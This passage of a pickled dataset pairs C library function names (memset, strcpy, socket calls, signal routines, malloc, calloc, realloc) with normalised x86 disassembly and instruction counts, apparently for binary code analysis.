S'"PUSH~EDI\nPUSH~ESI\nMOV~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~ECX,[ESP+0]\nCMP~EAX,ESI\nJNB~FOO\nMOV~EDI,EAX\nMOVSB~,\nJMP~FOO\nLEA~ESI,[ESI+ECX-0]\nLEA~EDI,[EAX+ECX-0]\nSTD\nMOVSB~,\nCLD\nPOP~ESI\nPOP~EDI\nRETN"'
p275
L39L
tp276
a(S'memset'
p277
S'"PUSH~EDI\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nSTOSB~,\nMOV~EAX,[ESP+0]\nPOP~EDI\nRETN"'
p278
L21L
tp279
a(S'strcpy'
p280
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nLODSB~,\nSTOSB~,\nTEST~AL,AL\nJNZ~FOO\nMOV~EAX,[ESP+0]\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p281
L27L
tp282
a(S'inet_addr'
p283
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nOR~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,EDX\nADD~ESP,0\nRETN"'
p284
L37L
tp285
a(S'accept'
p286
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p287
L43L
tp288
a(S'bind'
p289
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p290
L43L
tp291
a(S'connect'
p292
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p293
L43L
tp294
a(S'getsockname'
p295
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p296
L43L
tp297
a(S'getsockopt'
p298
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p299
L59L
tp300
a(S'listen'
p301
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p302
L35L
tp303
a(S'recv'
p304
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p305
L51L
tp306
a(S'recvfrom'
p307
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p308
L67L
tp309
a(S'send'
p310
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p311
L51L
tp312
a(S'sendto'
p313
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p314
L67L
tp315
a(S'setsockopt'
p316
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p317
L59L
tp318
a(S'socket'
p319
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p320
L43L
tp321
a(S'raise'
p322
S'"SUB~ESP,0\nCALL~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nRETN"'
p323
L24L
tp324
a(S'sigaddset'
p325
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJLE~FOO\nCMP~EAX,0\nJG~FOO\nADD~ESP,0\nJMP~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nADD~ESP,0\nRETN"'
p326
L42L
tp327
a(S'sigemptyset'
p328
S'"SUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nXOR~EAX,EAX\nADD~ESP,0\nRETN"'
p329
L25L
tp330
a(S'signal'
p331
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~EBX,[ESP+0]\nCMP~EAX,0\nJZ~FOO\nTEST~EBX,EBX\nJLE~FOO\nCMP~EBX,0\nJLE~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nMOV~[ESP+0],EAX\nMOV~EAX,0\nJMP~FOO\nMOV~[ESP+EAX*4+0],0\nDEC~EAX\nJNS~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nSBB~EAX,EAX\nAND~EAX,0\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nMOV~EAX,[ESP+0]\nJMP~FOO\nOR~EAX,0\nADD~ESP,0\nPOP~EBX\nRETN"'
p332
L175L
tp333
a(S'__sigismember'
p334
S'"PUSH~EBX\nMOV~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nDEC~ECX\nMOV~EBX,ECX\nAND~ECX,0\nSHR~EBX,0\nSHL~EAX,CL\nTEST~[EDX+EBX*4],EAX\nPOP~EBX\nSETNZ~AL\nMOVZX~EAX,AL\nRETN"'
p335
L36L
tp336
a(S'__sigaddset'
p337
S'"PUSH~EBX\nMOV~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EBX,[ESP+0]\nDEC~ECX\nMOV~EDX,ECX\nAND~ECX,0\nSHR~EDX,0\nSHL~EAX,CL\nOR~[EBX+EDX*4],EAX\nXOR~EAX,EAX\nPOP~EBX\nRETN"'
p338
L32L
tp339
a(S'__malloc_largebin_index'
p340
S'"MOV~EDX,EAX\nPUSH~EBX\nSHR~EDX,0\nMOV~EBX,EAX\nCMP~EDX,0\nMOV~EAX,0\nJA~FOO\nBSR~EAX,EDX\nLEA~ECX,[EAX+0]\nSHR~EBX,CL\nAND~EBX,0\nLEA~EAX,[EBX+EAX*4+0]\nPOP~EBX\nRETN"'
p341
L38L
tp342
a(S'malloc'
p343
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EBX,0\nJBE~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],0\nCMP~EAX,0\nJBE~FOO\nAND~EAX,0\nMOV~[ESP+0],EAX\nMOV~EBX,<STR>\nTEST~BL,0\nJNZ~FOO\nTEST~EBX,EBX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~[ESP+0],EBX\nJA~FOO\nMOV~EAX,[ESP+0]\nSHR~EAX,0\nLEA~ECX,[EAX+0]\nMOV~EDX,[ECX-0]\nTEST~EDX,EDX\nJZ~FOO\nMOV~EAX,[EDX+0]\nMOV~[ECX-0],EAX\nJMP~FOO\nCMP~[ESP+0],0\nJA~FOO\nMOV~EAX,[ESP+0]\nSHR~EAX,0\nMOV~[ESP+0],EAX\nLEA~ECX,<STR>\nMOV~EDX,[ECX+0]\nCMP~EDX,ECX\nJZ~FOO\nMOV~EBX,[ESP+0]\nMOV~EAX,[EDX+0]\nMOV~[ECX+0],EAX\nOR~[EDX+EBX+0],0\nMOV~[EAX+0],ECX\nLEA~EBX,[EDX+0]\nJMP~FOO\nMOV~EAX,[ESP+0]\nCALL~FOO\nAND~BL,0\nMOV~[ESP+0],EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDI,[EBP+0]\nMOV~EDX,[EBP+0]\nAND~EDI,0\nCMP~[ESP+0],0\nJA~FOO\nCMP~EDX,0\nJNZ~FOO\nCMP~EBP,<STR>\nJNZ~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,0\nCMP~EDI,EAX\nJA~FOO\nMOV~EAX,0\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nCMP~EDI,[ESP+0]\nJZ~FOO\nCMP~EDI,0\nJA~FOO\nMOV~ESI,EDI\nSHR~ESI,0\nLEA~EBX,<STR>\nMOV~EAX,[EBX+0]\nJMP~FOO\nMOV~EAX,EDI\nCALL~FOO\nMOV~ESI,EAX\nLEA~EAX,<STR>\nMOV~EDX,[EAX+0]\nMOV~[ESP+0],EDX\nMOV~EBX,EDX\nCMP~EDX,EAX\nJZ~FOO\nMOV~EBX,[EAX+0]\nCMP~EDI,[EBX+0]\nJNB~FOO\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EAX,EDI\nOR~EAX,0\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~ECX,[ECX+0]\nMOV~[ESP+0],ECX\nMOV~EBX,[ESP+0]\nCMP~EAX,[EBX+0]\nJB~FOO\nMOV~EBX,[EBX+0]\nMOV~EDX,ESI\nAND~ESI,0\nMOV~ECX,ESI\nMOV~EAX,0\nSAR~EDX,0\nSHL~EAX,CL\nOR~<STR>,EAX\nMOV~[EBP+0],EBX\nMOV~ESI,[ESP+0]\nMOV~[EBP+0],ESI\nMOV~[EBX+0],EBP\nMOV~[ESI+0],EBP\nMOV~EBP,<STR>\nCMP~EBP,0\nJNZ~FOO\nCMP~[ESP+0],0\nJBE~FOO\nMOV~EAX,[ESP+0]\nLEA~EDX,<STR>\nMOV~EAX,[EDX+0]\nJMP~FOO\nMOV~EBX,[EAX+0]\nMOV~ECX,[EAX+0]\nAND~EBX,0\nCMP~EBX,[ESP+0]\nJB~FOO\nMOV~EDX,[EAX+0]\nCMP~[EDX+0],EAX\nJNZ~FOO\nCMP~[ECX+0],EAX\nJZ~FOO\nCALL~FOO\nMOV~ESI,EBX\nSUB~ESI,[ESP+0]\nMOV~[EDX+0],ECX\nMOV~[ECX+0],EDX\nCMP~ESI,0\nLEA~ECX,[EAX+0]\nJBE~FOO\nMOV~EBX,[ESP+0]\nLEA~EDX,[EAX+EBX]\nOR~EBX,0\nMOV~[EAX+0],EBX\nMOV~EAX,ESI\nOR~EAX,0\nMOV~[EBP+0],EDX\nMOV~[EBP+0],EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~[EDX+0],EAX\nMOV~[EDX+ESI],ESI\nJMP~FOO\nMOV~EAX,ECX\nCMP~EAX,EDX\nJNZ~FOO\nMOV~ECX,[ESP+0]\nMOV~ESI,0\nINC~ECX\nMOV~EDI,ECX\nSHR~EDI,0\nLEA~EBX,<STR>\nAND~ECX,0\nMOV~EDX,<STR>\nSHL~ESI,CL\nCMP~ESI,EDX\nJA~FOO\nTEST~ESI,ESI\nJNZ~FOO\nINC~EDI\nCMP~EDI,0\nJA~FOO\nMOV~EDX,<STR>\nTEST~EDX,EDX\nJZ~FOO\nMOV~EAX,EDI\nMOV~ESI,0\nSHL~EAX,0\nLEA~EBX,[EAX+0]\nJMP~FOO\nADD~EBX,0\nADD~ESI,ESI\nTEST~EDX,ESI\nJZ~FOO\nMOV~ECX,[EBX+0]\nCMP~ECX,EBX\nJNZ~FOO\nMOV~EAX,ESI\nLEA~EBX,[ECX+0]\nNOT~EAX\nAND~EDX,EAX\nADD~ESI,ESI\nMOV~<STR>,EDX\nJMP~FOO\nMOV~EDX,[ECX+0]\nMOV~EAX,[ECX+0]\nAND~EDX,0\nMOV~ESI,EDX\nSUB~ESI,[ESP+0]\nMOV~[EBX+0],EAX\nMOV~[EAX+0],EBX\nCMP~ESI,0\nJA~FOO\nOR~[ECX+EDX+0],0\nJMP~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,0\nLEA~EDX,[ECX+EAX]\nMOV~[EBP+0],EDX\nMOV~[EBP+0],EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nJA~FOO\nMOV~<STR>,EDX\nOR~[ESP+0],0\nMOV~EAX,ESI\nMOV~EBX,[ESP+0]\nOR~EAX,0\nMOV~[ECX+0],EBX\nMOV~[EDX+ESI],ESI\nMOV~[EDX+0],EAX\nLEA~EBX,[ECX+0]\nJMP~FOO\nMOV~EBX,<STR>\nMOV~ESI,[ESP+0]\nADD~ESI,0\nMOV~ECX,[EBX+0]\nMOV~[ESP+0],ESI\nAND~ECX,0\nCMP~ECX,ESI\nJB~FOO\nMOV~EAX,[ESP+0]\nLEA~EDX,[EBX+EAX]\nOR~EAX,0\nMOV~<STR>,EDX\nMOV~[EBX+0],EAX\nSUB~ECX,[ESP+0]\nJMP~FOO\nMOV~EDX,<STR>\nTEST~<STR>,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nJMP~FOO\nLEA~ECX,[EDX-0]\nMOV~EBX,[ESP+0]\nMOV~[ESP+0],ECX\nCMP~EBX,<STR>\nJB~FOO\nMOV~EAX,<STR>\nCMP~EAX,<STR>\nJGE~FOO\nMOV~EAX,ECX\nLEA~EBX,[EDX+EBX+0]\nNOT~EAX\nAND~EBX,EAX\nCMP~EBX,[ESP+0]\nJBE~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,EAX\nAND~ECX,0\nJZ~FOO\nMOV~EAX,0\nMOV~ESI,EBX\nSUB~EAX,ECX\nADD~EDX,EAX\nSUB~ESI,EAX\nMOV~[EDX],EAX\nMOV~EAX,ESI\nJMP~FOO\nMOV~DWORDPTR[EAX],0\nMOV~EAX,EBX\nOR~EAX,0\nMOV~[EDX+0],EAX\nMOV~EAX,<STR>\nINC~EAX\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJLE~FOO\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nADD~EAX,EBX\nMOV~<STR>,EAX\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nJMP~FOO\nMOV~EAX,<STR>\nMOV~[ESP+0],EAX\nMOV~EBP,[EAX+0]\nMOV~EAX,[ESP+0]\nADD~EAX,0\nAND~EBP,0\nADD~EAX,<STR>\nTEST~<STR>,0\nJZ~FOO\nSUB~EAX,EBP\nMOV~EDX,[ESP+0]\nADD~EAX,[ESP+0]\nNOT~EDX\nMOV~ESI,EDX\nMOV~[ESP+0],EDX\nAND~ESI,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nOR~EDX,0\nMOV~EBX,EAX\nCMP~EAX,0\nJNZ~FOO\nTEST~<STR>,0\nJZ~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,EBP\nADD~ESI,EAX\nAND~ESI,[ESP+0]\nCMP~ESI,0\nJA~FOO\nMOV~ESI,0\nCMP~ESI,[ESP+0]\nJBE~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nAND~<STR>,0\nLEA~EDX,[EAX+ESI]\nCMP~EBX,0\nJZ~FOO\nMOV~ECX,[ESP+0]\nADD~<STR>,ESI\nADD~ECX,EBP\nCMP~EBX,ECX\nJNZ~FOO\nCMP~EDX,0\nJNZ~FOO\nLEA~EAX,[ESI+EBP]\nMOV~ECX,[ESP+0]\nOR~EAX,0\nMOV~[ECX+0],EAX\nJMP~FOO\nMOV~EAX,<STR>\nTEST~AL,0\nJZ~FOO\nTEST~EBP,EBP\nJZ~FOO\nCMP~EBX,ECX\nJNB~FOO\nAND~EAX,0\nMOV~<STR>,EAX\nTEST~<STR>,0\nJZ~FOO\nTEST~EBP,EBP\nJZ~FOO\nMOV~EAX,EBX\nSUB~EAX,ECX\nADD~<STR>,EAX\nMOV~EDX,EBX\nAND~EDX,0\nJNZ~FOO\nMOV~EDI,EBX\nXOR~EAX,EAX\nJMP~FOO\nMOV~EAX,0\nSUB~EAX,EDX\nLEA~EDI,[EBX+EAX]\nLEA~ESI,[EBX+ESI]\nLEA~ECX,[EAX+EBP]\nMOV~EDX,ESI\nMOV~[ESP+0],ESI\nADD~EDX,ECX\nMOV~ESI,[ESP+0]\nLEA~EAX,[EDX+ESI]\nAND~EAX,[ESP+0]\nSUB~ESP,0\nSUB~EAX,EDX\nLEA~ESI,[ECX+EAX]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nJMP~FOO\nCMP~EAX,EBX\nJNB~FOO\nAND~<STR>,0\nMOV~EDX,[ESP+0]\nJMP~FOO\nCMP~EDX,0\nJZ~FOO\nMOV~EDI,EBX\nXOR~ESI,ESI\nJMP~FOO\nSUB~ESP,0\nMOV~EDI,EBX\nPUSH~0\nCALL~FOO\nMOV~EDX,EAX\nSUB~EAX,EBX\nSUB~EAX,ESI\nADD~<STR>,EAX\nXOR~ESI,ESI\nADD~ESP,0\nCMP~EDX,0\nJZ~FOO\nSUB~EDX,EDI\nMOV~<STR>,EDI\nLEA~EAX,[EDX+ESI]\nOR~EAX,0\nMOV~[EDI+0],EAX\nADD~<STR>,ESI\nTEST~EBP,EBP\nJZ~FOO\nLEA~EAX,[EBP-0]\nMOV~ECX,[ESP+0]\nAND~EAX,0\nMOV~EDX,EAX\nOR~EDX,0\nCMP~EAX,0\nMOV~[ECX+0],EDX\nMOV~[ECX+EAX+0],0\nMOV~[ECX+EAX+0],0\nJBE~FOO\nSUB~ESP,0\nMOV~EAX,ECX\nADD~EAX,0\nMOV~EBX,<STR>\nPUSH~EAX\nMOV~<STR>,0\nCALL~FOO\nMOV~<STR>,EBX\nADD~ESP,0\nMOV~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nADD~EAX,<STR>\nCMP~EAX,<STR>\nJBE~FOO\nMOV~<STR>,EAX\nMOV~EBX,<STR>\nMOV~ECX,[EBX+0]\nAND~ECX,0\nCMP~ECX,[ESP+0]\nJB~FOO\nMOV~ESI,[ESP+0]\nMOV~EAX,ESI\nSUB~ECX,ESI\nLEA~EDX,[EBX+ESI]\nOR~EAX,0\nMOV~<STR>,EDX\nMOV~[EBX+0],EAX\nOR~ECX,0\nADD~EBX,0\nMOV~[EDX+0],ECX\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,EDI\nSUB~EAX,[ESP+0]\nLEA~EDX,[EBP+ECX+0]\nOR~ECX,0\nMOV~<STR>,EDX\nMOV~[EBP+0],ECX\nMOV~ECX,EAX\nMOV~<STR>,EDX\nOR~ECX,0\nMOV~<STR>,EDX\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~[EDX+0],ECX\nMOV~[EDX+EAX],EAX\nJMP~FOO\nMOV~EBX,[ESP+0]\nOR~[EBP+EBX+0],0\nLEA~EBX,[EBP+0]\nJMP~FOO\nOR~[EAX+EBX+0],0\nMOV~EBX,ECX\nJMP~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p344
L1908L
tp345
a(S'calloc'
p346
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EBX,EDX\nIMUL~EBX,ECX\nTEST~EDX,EDX\nJZ~FOO\nMOV~EDI,EDX\nMOV~EAX,EBX\nXOR~EDX,EDX\nDIV~,EDI\nCMP~ECX,EAX\nJZ~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nPUSH~ESI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,[EAX-0]\nTEST~AL,0\nJNZ~FOO\nAND~EAX,0\nLEA~EDX,[EAX-0]\nMOV~EAX,EDX\nSHR~EAX,0\nCMP~EAX,0\nJBE~FOO\nPUSH~ECX\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~DWORDPTR[EBX],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCMP~EAX,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p347
L244L
tp348
a(S'realloc'
p349
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nCMP~[ESP+0],0\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nJMP~FOO\nTEST~EBX,EBX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nJMP~FOO\nPUSH~EDI\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~EBX,0\nJBE~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],0\nCMP~EAX,0\nJBE~FOO\nAND~EAX,0\nMOV~[ESP+0],EAX\nMOV~EDI,[ESP+0]\nSUB~EDI,0\nMOV~EDX,[EDI+0]\nMOV~EAX,EDX\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~DL,0\nJNZ~FOO\nMOV~ECX,[ESP+0]\nMOV~EBX,EAX\nCMP~EAX,ECX\nJNB~FOO\nLEA~ESI,[EDI+EAX]\nCMP~ESI,<STR>\nJNZ~FOO\nMOV~EAX,[ESI+0]\nMOV~ECX,EBX\nAND~EAX,0\nADD~ECX,EAX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nCMP~ECX,EAX\nJB~FOO\nAND~EDX,0\nOR~EDX,[ESP+0]\nMOV~[EDI+0],EDX\nMOV~ESI,[ESP+0]\nSUB~ECX,ESI\nLEA~EAX,[EDI+ESI]\nOR~ECX,0\nMOV~<STR>,EAX\nMOV~[EAX+0],ECX\nJMP~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,EDX\nAND~EAX,0\nTEST~[ESI+EAX+0],0\nJNZ~FOO\nAND~EDX,0\nMOV~EBX,[ESP+0]\nADD~EBX,EDX\nCMP~EBX,[ESP+0]\nJB~FOO\nMOV~EDX,[ESI+0]\nMOV~EAX,[ESI+0]\nCMP~[EDX+0],ESI\nJNZ~FOO\nCMP~[EAX+0],ESI\nJZ~FOO\nCALL~FOO\nMOV~[EDX+0],EAX\nMOV~[EAX+0],EDX\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nTEST~EAX,EAX\nJZ~FOO\nLEA~EBX,[EAX-0]\nCMP~EBX,ESI\nMOV~EAX,[EBX+0]\nJNZ~FOO\nAND~EAX,0\nMOV~EDX,[ESP+0]\nLEA~EBX,[EAX+EDX]\nJMP~FOO\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nMOV~ECX,EAX\nSHR~ECX,0\nCMP~ECX,0\nJBE~FOO\nPUSH~ESI\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ESI,[ESP+0]\nCMP~ECX,0\nMOV~EAX,[ESI]\nMOV~[EDX],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nCMP~ECX,0\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nCMP~ECX,0\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nJBE~FOO\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EDX+0],EAX\nSUB~ESP,0\nADD~EBX,0\nPUSH~[ESP+0]\nCALL~FOO\nJMP~FOO\nMOV~ECX,EBX\nSUB~ECX,[ESP+0]\nCMP~ECX,0\nJA~FOO\nMOV~EAX,[EDI+0]\nAND~EAX,0\nOR~EAX,EBX\nMOV~[ED